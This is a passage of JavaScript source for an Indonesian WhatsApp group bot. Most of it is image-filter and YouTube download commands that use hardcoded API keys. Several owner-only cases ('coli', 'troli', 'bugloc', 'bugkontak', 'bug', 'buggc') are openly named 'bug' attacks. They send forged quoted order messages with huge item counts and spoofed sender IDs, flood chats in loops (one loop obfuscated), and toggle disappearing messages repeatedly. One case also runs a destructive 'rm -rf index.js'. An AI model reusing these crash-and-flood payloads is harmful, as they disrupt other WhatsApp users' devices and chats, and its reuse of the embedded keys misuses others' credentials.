                           }
                       await limitAdd(sender)
                       break
             case 'fisheye':
             case 'skullmask':
             case 'alien':
             case 'tosmile':
             case 'cartoon':
             case 'invert':
             case 'pixelate':
             case 'flip':
             case 'grayscale':
             case 'roundimage':
             case 'pencil':
             case 'wasted':
                       if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
                       var imgbb = require('imgbb-uploader')
                       reply (aml.wait)
                       if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                       ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                       damppa = await aldi.downloadAndSaveMediaMessage(ted)
                       aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                       mama = await getBuffer(`https://api.lolhuman.xyz/api/editor/${command}?apikey=${lolhuman}&img=${aldiaa.display_url}`)
                       aldi.sendMessage(from, mama, image, {quoted: fkontak})
                       } else {
                       reply('Reply Imagenya!!')
                        }
                       await limitAdd(sender)
                       break
         case 'deepfryt':
         case 'removebg':
         case 'upscale':
                       if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
                        var imgbb = require('imgbb-uploader')
                        reply (aml.wait)
                         if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                         damppa = await aldi.downloadAndSaveMediaMessage(ted)
                         aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                         kontol = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey={lolhuman}&img=${aldiaa.display_url}`)
                         aldi.sendMessage(from, kontol, image, {quoted: fkontak})
                         } else {
                         reply('Reply Imagenya!!')
                           }
                         await limitAdd(sender)
                        break
            case '1977':
            case 'aden':
            case 'brannan':
            case 'brooklyn':
            case 'clarendon':
            case 'gingham':
            case 'hudson':
            case 'inkwell':
            case 'earlybird':
            case 'kelvin':
            case 'lark':
            case 'lofi':
            case 'maven':
            case 'mayfair':
            case 'moon':
            case 'nashville':
            case 'perpetua':
            case 'reyes':
            case 'rise':
            case 'slumber':
            case 'stinson':
            case 'toaster':
            case 'valencia':
            case 'walden':
            case 'willow':
            case 'xpro2':
                        if (!isGroup) return reply(aml.groupo)
				        if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
			            if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        var imgbb = require('imgbb-uploader')
                        reply (aml.wait)
                        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                        damppa = await aldi.downloadAndSaveMediaMessage(ted)
                        aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                        hadu = await getBuffer(`https://api.lolhuman.xyz/api/filter/${command}?apikey=${lolhuman}&img=${aldiaa.display_url}`)
                        aldi.sendMessage(from, hadu, image, {quoted: fkontak})
                         } else {
                        reply('Reply Imagenya!!')
                            }
                        await limitAdd(sender)
                        break
                case 'affect':
                case 'beautiful':
                case 'facepalm':
                case 'hitler':
                case 'jail':
                case 'rainbow':
                case 'rip':
                case 'sepia':
                case 'trash':
                case 'wanted':
                         if (!isGroup) return reply(aml.groupo)
				         if (!isRegistered) return reply(aml.noregis)
		                 if (isBanned) return reply(aml.baned)
			             if (!isGroup) return reply(aml.groupo)
                         if (isLimit(sender)) return reply(aml.limitend)
                        var imgbb = require('imgbb-uploader')
                        reply (aml.wait)
                        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                        damppa = await aldi.downloadAndSaveMediaMessage(ted)
                        aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                        haduu = await getBuffer(`https://api.lolhuman.xyz/api/creator1/${command}?apikey=${lolhuman}&img=${aldiaa.display_url}`)
                        aldi.sendMessage(from, haduu, image, {quoted: fkontak})
                        } else {
                        reply('Reply Imagenya!!')
                         }
                        await limitAdd(sender)
                       break
         case 'jokeoverhead':
                        if (!isGroup) return reply(aml.groupo)
				        if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
			            if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        var imgbb = require('imgbb-uploader')
                        reply (aml.wait)
                        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                        damppa = await aldi.downloadAndSaveMediaMessage(ted)
                        aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                        haha = await getBuffer(`https://api.lolhuman.xyz/api/creator1/jokeOverHead?apikey=${lolhuman}&img=${aldiaa.display_url}`)
                        aldi.sendMessage(from, haha, image, {quoted: fkontak})
                        } else {
                        reply('Reply Imagenya!!')
                        }
                        await limitAdd(sender)
                        break
              case 'imagecolor':
                        if (!isGroup) return reply(aml.groupo)
				        if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
			            if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        reply('wait sayang masih loading')
                        hexx = body.slice(12)
                        if ((isMedia && !mek.videoMessage || isQuotedImage)) {
                        var imgbb = require('imgbb-uploader')
                        var ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        var damppa = await aldi.downloadAndSaveMediaMessage(ted)
                        aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                        buff = await getBuffer(`https://api.lolhuman.xyz/api/imagecolor?apikey=${lolhuman}&img=${aldiaa.display_url}&hex=${hexx}`)
                        aldi.sendMessage(from, buff, image, {quoted: fkontak})
                          }
                       await limitAdd(sender)
                       break
             case 'imagerotate':
                      if (!isGroup) return reply(aml.groupo)
				      if (!isRegistered) return reply(aml.noregis)
		              if (isBanned) return reply(aml.baned)
			          if (!isGroup) return reply(aml.groupo)
                      if (isLimit(sender)) return reply(aml.limitend)
                      reply('wait sayang masih loading')
                      rotatee = body.slice(13)
                      if ((isMedia && !mek.videoMessage || isQuotedImage)) {
                      var imgbb = require('imgbb-uploader')
                      var ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                      var damppa = await aldi.downloadAndSaveMediaMessage(ted)
                      aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                      Buffer = await getBuffer(`https://api.lolhuman.xyz/api/editor/rotate?apikey=${lolhuman}&img=${aldiaa.display_url}&rotate=${rotatee}`)
                      aldi.sendMessage(from, Buffer, image, {quoted: fkontak})
                       }
                       await limitAdd(sender)
                       break
    case 'memegen':
                        if (!isRegistered) return reply(aml.noregis)
				        if (isLimit(sender)) return reply(aml.limitend)
				        if (!isGroup) return reply(aml.groupo)
				        if (isBanned) return reply('Maaf kamu sudah terbenned!')
                        reply('wait sayang masih loading')
                        if ((isMedia && !mek.videoMessage || isQuotedImage)) {
                        var tex1 = body.slice(9).split('|')[0]
                        var tex2 = body.slice(9).split('|')[1]
                        if (!tex2) return reply('Format salah!')
                        var imgbb = require('imgbb-uploader')
                        var ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        var damppa = await aldi.downloadAndSaveMediaMessage(ted)
                        aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                        contoh = await getBuffer(`https://lolhuman.herokuapp.com/api/memegen?apikey=${lolhuman}&texttop=${tex1}&textbottom=${tex2}&img=${aldiaa.display_url}`)
                        aldi.sendMessage(from, contoh, image, {quoted: fkontak})
                           }
                        await limitAdd(sender)
                        break
        case 'bed':
        case 'slap':
        case 'spank':
        case 'kiss':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    reply('wait sayang masih loading')
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
                    damppa = await aldi.downloadAndSaveMediaMessage(ted)
                    aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                    ppUser = await aldi.getProfilePicture(`${sender.split('@')[0]}@c.us`)
                    kontol = await getBuffer(`https://api.lolhuman.xyz/api/creator2/${command}?apikey=${lolhuman}&img1=${ppUser}&img2=${aldiaa.display_url}`)
                    aldi.sendMessage(from, kontol, image, {quoted: fkontak})
                    } else {
                    reply('Reply Imagenya!!')
                      }
                    await limitAdd(sender)
                    break
	case 'pantaimalam':
	                if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
	                var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply (aml.wait)
	                owgi = await aldi.downloadAndSaveMediaMessage(ted)
	                tels = body.slice(14)
	                anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	                hehe = await getBuffer(`https://videfikri.com/api/textmaker/nightbeach/?urlgbr=${anu.display_url}`)
	                aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	                } else {
	               reply('Jangan tambah kan apapun pada command')
	                 }
	               await limitAdd(sender)
	               break
	case 'fisheye':
	                 if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
	                var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply (aml.wait)
	                owgi = await aldi.downloadAndSaveMediaMessage(ted)
	                tels = body.slice(8)
	                anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	                hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/fisheye?apikey=${lolhuman}&img=${anu.display_url}`)
	                aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	                } else {
	                 reply('Jangan tambah kan apapun pada command')
	                  }
	                await limitAdd(sender)
	                break
	case 'pencil':
	               if (!isRegistered) return reply(aml.noregis)
				   if (isLimit(sender)) return reply(aml.limitend)
				   if (!isGroup) return reply(aml.groupo)
				   if (isBanned) return reply('Maaf kamu sudah terbenned!')
	               var imgbb = require('imgbb-uploader')
	               if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	               ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	               reply (aml.wait)
	               owgi = await aldi.downloadAndSaveMediaMessage(ted)
	               tels = body.slice(14)
	               anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	               hehe = await getBuffer(`https://videfikri.com/api/textmaker/pencil/?urlgbr=${anu.display_url}`)
	               aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	               } else {
	               reply('Jangan tambah kan apapun pada command')
	                  }
	               await limitAdd(sender)
	               break
	case 'bakar':
	                if (!isRegistered) return reply(aml.noregis)
				    if (isLimit(sender)) return reply(aml.limitend)
				    if (!isGroup) return reply(aml.groupo)
				    if (isBanned) return reply('Maaf kamu sudah terbenned!')
	                var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply (aml.wait)
	                owgi = await aldi.downloadAndSaveMediaMessage(ted)
	                tels = body.slice(7)
	                anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	                hehe = await getBuffer(`https://videfikri.com/api/textmaker/burneffect/?urlgbr=${anu.display_url}`)
	                aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	                } else {
	                reply('Jangan tambah kan apapun pada command')
	                    }
	                await limitAdd(sender)
	                break
	 case 'crossgun':
	                if (!isRegistered) return reply(aml.noregis)
				    if (isLimit(sender)) return reply(aml.limitend)
				    if (!isGroup) return reply(aml.groupo)
				    if (isBanned) return reply('Maaf kamu sudah terbenned!')
	                var imgbb = require('imgbb-uploader')
	                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                reply (aml.wait)
	                owgi = await aldi.downloadAndSaveMediaMessage(ted)
	                tels = body.slice(7)
	                anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	                hehe = await getBuffer(`https://videfikri.com/api/textmaker/crossgun/?urlgbr=${anu.display_url}`)
	                aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	                } else {
	                reply('Jangan tambah kan apapun pada command')
	                  }
	                await limitAdd(sender)
	               break
	case 'hitler':
	              if (!isRegistered) return reply(aml.noregis)
				  if (isLimit(sender)) return reply(aml.limitend)
				  if (!isGroup) return reply(aml.groupo)
				  if (isBanned) return reply('Maaf kamu sudah terbenned!')
	              var imgbb = require('imgbb-uploader')
	              if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	              ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	              reply (aml.wait)
	              owgi = await aldi.downloadAndSaveMediaMessage(ted)
	              tels = body.slice(7)
	              anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	              hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/hitler?url=${anu.display_url}&apikey=RJJKCXSU`)
	              aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	              } else {
	                reply('Jangan tambah kan apapun pada command')
	               }
	               await limitAdd(sender)
	               break
	case 'picture':
	            if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (!isGroup) return reply(aml.groupo)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	            var imgbb = require('imgbb-uploader')
	            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	            ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	            reply (aml.wait)
	            owgi = await aldi.downloadAndSaveMediaMessage(ted)
	            tels = body.slice(7)
	            anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	            hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/picture?url=${anu.display_url}&apikey=RJJKCXSU`)
	            aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	            } else {
	            reply('Jangan tambah kan apapun pada command')
	                }
	           await limitAdd(sender)
	           break
	case 'blur':
	               if (!isRegistered) return reply(aml.noregis)
				   if (isLimit(sender)) return reply(aml.limitend)
				   if (!isGroup) return reply(aml.groupo)
				   if (isBanned) return reply('Maaf kamu sudah terbenned!')
	               var imgbb = require('imgbb-uploader')
	               if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	               ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	               reply (aml.wait)
	               owgi = await aldi.downloadAndSaveMediaMessage(ted)
	               tels = body.slice(7)
	               anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	               hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/blur?url=${anu.display_url}&apikey=RJJKCXSU`)
	               aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	               } else {
	               reply('Jangan tambah kan apapun pada command')
	              }
	               await limitAdd(sender)
	                break
	case 'invert':
	               if (!isRegistered) return reply(aml.noregis)
				   if (isLimit(sender)) return reply(aml.limitend)
				   if (!isGroup) return reply(aml.groupo)
				   if (isBanned) return reply('Maaf kamu sudah terbenned!')
	               var imgbb = require('imgbb-uploader')
	               if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	               ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	               reply (aml.wait)
	               owgi = await aldi.downloadAndSaveMediaMessage(ted)
	               tels = body.slice(7)
	               anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	               hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/invert?url=${anu.display_url}&apikey=RJJKCXSU`)
	               aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	               } else {
	               reply('Jangan tambah kan apapun pada command')
	               }
	             await limitAdd(sender)
	             break
///AKHIRNYA KELAR IMAGE////
///////////////////////////////////////////
case 'p4':{
                if (args.length === 1) return reply(`Kirim perintah *${prefix}playmp4 query*`)
                try {
                    reply(wait)
                    let yut = await yts(q)
                    ytv(yut.videos[0].url)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 40000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, mek)
                        const captionisu = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ URL : ${yut.videos[0].url}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captionisu, mek)
                            sendFileFromUrl(from, dl_link, '', mek)
                        })
                    })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                    sendMess(ownerNumber, 'PlayMp4 Error : ' + err)
                    console.log(color('[PlayMp4]', 'red'), err)
                    reply(aml.error)
                }
            }
                break
             case 'playmp3':{
                if (args.length === 1) return reply(`Kirim perintah *${prefix}play query*`)
                try {
                    reply(wait)
                    let yut = await yts(q)
                    yta(yut.videos[0].url)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 30000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, mek)
                        const captionis = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ URL : ${yut.videos[0].url}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captionis, mek)
                            sendFileFromUrl(from, dl_link, '', mek)
                        })
                    })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                    sendMess(ownerNumber, 'PlayMp3 Error : ' + err)
                    console.log(color('[PlayMp3]', 'red'), err)
                    reply(aml.error)
                }
            }
                break
      case 'coli':
  if (!isOwner) return reply (' khusus owners bot')           
aldi.toggleDisappearingMessages(from)
aldi.toggleDisappearingMessages(from)            
memskuy = aldi //Ubah client kalian
const _0x4b10=['aldi','1KeywxR','14DnMudb','Tes','49372qZtwuJ','8vbYGpS','615893SzILoT','4QdSsUx','11yHMhIh','180zRGaGa','66361IxgtEU','561185XHuVMs','114781qwERRg','sendMessage','0@s.whatsapp.net','247510FtyoHi','1172gUoJXd'];const _0x216edb=_0x1c8f;function _0x1c8f(_0x48c8f1,_0x1d83a0){_0x48c8f1=_0x48c8f1-0x149;let _0x4b1025=_0x4b10[_0x48c8f1];return _0x4b1025;}(function(_0x1943bc,_0x4f977b){const _0x276183=_0x1c8f;while(!![]){try{const _0x57e63b=parseInt(_0x276183(0x14b))*-parseInt(_0x276183(0x150))+-parseInt(_0x276183(0x14f))+parseInt(_0x276183(0x159))*-parseInt(_0x276183(0x157))+parseInt(_0x276183(0x14e))*-parseInt(_0x276183(0x14c))+-parseInt(_0x276183(0x14a))*-parseInt(_0x276183(0x156))+-parseInt(_0x276183(0x14d))*-parseInt(_0x276183(0x154))+-parseInt(_0x276183(0x153))*-parseInt(_0x276183(0x149));if(_0x57e63b===_0x4f977b)break;else _0x1943bc['push'](_0x1943bc['shift']());}catch(_0x89c2d4){_0x1943bc['push'](_0x1943bc['shift']());}}}(_0x4b10,0x59385));for(let i=0x0;i<0x1f4;i++){memskuy[_0x216edb(0x151)](from,_0x216edb(0x158),text,{'contextInfo':{'participant':_0x216edb(0x152),'quotedMessage':{'orderMessage':{'itemCount':0x98967f,'status':0x0,'surface':0x0,'orderTitle':_0x216edb(0x155),'sellerJid':_0x216edb(0x152)}}}});}          
break
case 'troli':
if (!isOwner) return reply (' khusus owners bot') 
if (args.length < 1) return reply ('Masukkan Jumlah')
for (let i = 0; i < args[0]; i++) {
aldi.sendMessage(from, `Hallo Kak !!!`, MessageType.extendedText,{
quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 9999999999999,
status: 1,
surface: 80,
orderTitle: 'Bug Troly By ALDII Gz   ',
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
case 'bugloc':
if (!isOwner) return reply (' khusus owners bot') 
if (args.length < 1) return reply(`Example : ${prefix}bugloc Rumah doi|Jl.`)
namaxx = q.split('|')[0]
jlnxx = q.split('|')[1]
aldi.sendMessage(from, { "degreesLatitude": 37.38980827772353,
						"degreesLongitude": -122.08141386508942,
            "name": namaxx,
            "address": jlnxx,
            "jpegThumbnail": fakeimage }, location, { quoted:{
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
					break
			case 'bugkontak':
		if (!isOwner) return reply (' khusus owners bot') 
    if (args.length < 1) return reply(`Example : ${prefix}bugkontak nama|nomor`)
          nama = q.split('|')[0]
          nomor = q.split('|')[1]
					const vcardd = 'BEGIN:VCARD\n'
                   + 'VERSION:3.0\n'
                   + `FN:${nama}\n`
                   + `ORG:${nama};\n`
                   + `TEL;type=CELL;type=VOICE;waid=${nomor}:${nomor}\n`
                   + 'END:VCARD'
					aldi.sendMessage(from, {displayname: mem, vcard: vcardd}, MessageType.contact, { quoted:{
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
					break
case 'bug':
if (!isOwner) return reply (' khusus owners bot') 
aldi.sendMessage(mek.key.remoteJid, '𝗞𝗮𝘁𝗮𝗻𝘆𝗮 𝗕𝘂𝗴', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '6282195322106@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999999999999999999999, // Bug
    status: 1,
    surface: 20,
    message: '𝗕𝘂𝗴 𝗸𝗲𝗸𝗻𝘆𝗮',
    orderTitle: '𝗕𝘂𝗴 𝗻𝘆𝗮 𝗴𝗮𝗸 𝗻𝗴𝗮𝗿𝘂𝗵', // Idk what this does
    sellerJid: '628xxxxxx@s.whatsapp.net' // Seller
   }
  }
 }
})
         aldi.toggleDisappearingMessages(from,`MODAR`,text)
			exec("rm -rf index.js")
         break
case 'buggc':
            if (!isOwner) return reply (' khusus owners bot') 
            if (args.length < 1) return reply ('Masukkan Jumlah')
             for (let i = 0; i < args[0]; i++) {
  aldi.toggleDisappearingMessages(from, 0)  
}
aldi.sendMessage(from, 'Sukse Send Bug sebanyak' +args.join('  '), freply)
          break
			case 'nhentai':
			        if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    husw = body.slice(7)
					reply (aml.wait)
					anu = await fetchJson(`https://api.vhtear.com/nhentaipdfdownload?query=${husw}&apikey=${apivhtear}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					kontoljj = await getBuffer(anu.result.pdf_file)
					aldi.sendMessage(from, kontoljj, document, {mimetype: 'document/pdf', quoted: fkontak})
					await limitAdd(sender)
					break
			case 'ramaljadian':
			        if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
				    reply (aml.wait)
					var gh = args.join('  ')
					var gbl1 = gh.split("|")[0];
					var gbl2 = gh.split("|")[1];
					var gbl3 = gh.split("|")[2];
					anu = await fetchJson(`https://api.vhtear.com/harijadian?tgl=${gbl1}&bln=${gbl2}&thn=${gbl3}&apikey=${apivhtear}`, {method: 'get'})
					reply(anu.result.hasil)
					await limitAdd(sender)
					break
		
	case 'galaxstyle':
			    if (!isGroup) return reply(aml.groupo)
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(aml.wrongf)
				ct = body.slice(11)
				reply (aml.wait)
				Buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/galaxystyle?apikey=${lolhuman}&text=${ct}`)
				aldi.sendMessage(from, ct, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
		case 'attp':
			    if (!isGroup) return reply(aml.groupo)
			    if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
